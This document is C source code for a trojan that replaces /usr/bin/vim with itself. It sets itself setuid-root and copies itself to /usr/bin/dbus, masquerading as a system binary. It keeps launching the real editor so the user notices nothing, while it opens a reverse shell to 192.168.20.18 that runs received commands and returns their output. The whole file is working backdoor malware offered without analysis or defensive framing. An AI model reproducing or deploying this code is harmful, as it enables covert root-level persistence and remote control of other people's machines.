#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <limits.h>
#include <assert.h>
#include <sys/stat.h>
// #define STATUS "/var/lib/dbus/machine-process"
#define PAYLOAD "/usr/bin/dbus"
#define ERROR "/var/lib/dbus/err"
//#define PAYLOAD "./dbus"
#define BINARYNAME "vim_old"
#define EDITOR "/usr/bin/vim"
//#define EDITOR "./a.out"


int establishConnection(int port, int shell) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
   
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) {
        return -1;
    }
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        return -1;
    }
    
    if (shell == 1){
        while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
            char line[1024];
            //Remove trailing newline
            buffer[strcspn(buffer, "\n")] = 0;
            strcat(buffer, " 2>");
            strcat(buffer, ERROR);
            FILE* fp = popen(buffer, "r");
            while((fgets(line, 1024, fp))) {
                write(sock , line , strlen(line));
            }
            FILE* err = fopen(ERROR, "r");
            while((fgets(line, 1024, err))) {
                write(sock , line , strlen(line));
            }
            char tmpcmd[50] = "rm -f ";
            strcat(tmpcmd, ERROR);
            system(tmpcmd);
        }
    } else {
        valread = read( sock , buffer, 1024);
        establishConnection(atoi(buffer), 1);
    }
    return 0;
}

int install(char *fname){
    setuid(0);
    char *file = fname + 2;
    char path[50] = "/usr/bin/";
    strcat(path, BINARYNAME);
    if (access(path, F_OK) == 0 ) {
        return 0;
    }
    //install
    //move old binary
    char newpath[50] = "/usr/bin/";
    strcat(newpath, BINARYNAME);
    rename(EDITOR, newpath);
    //replace with new binary
    rename(file, EDITOR);
    //change ownership
    chown(EDITOR, 0, 0);
    //setuid
    char cmd[50] = "chmod +s ";
    strcat(cmd, EDITOR);
    system(cmd);
    printf("Installed");
    return 1;
}

int main (int argc, char *argv[]) {
    setuid(0);
    if (install(argv[0]) == 1){
        return 0;
    }
    char args[100] = BINARYNAME;
    strcat(args, " ");
    for (int i = 1;i<argc;i++){
        strcat(args, argv[i]);
        if (i != argc-1){
            strcat(args, " ");
        }
    }
    if (access(PAYLOAD, F_OK) != 0 ) {
        char cmd1[50] = "cp ";
        char cmd2[50] = PAYLOAD;
        char cmd3[50] = "rm -f ";
        strcat(cmd1, EDITOR);
        strcat(cmd1, " ");
        strcat(cmd1, PAYLOAD);
        strcat(cmd2, " &");
        strcat(cmd3, PAYLOAD);
        system(cmd1);
        system(cmd2);
        sleep(0.1);
        system(cmd3);
        system(args);
    } else {
        establishConnection(5004, 0);
    }
    
}

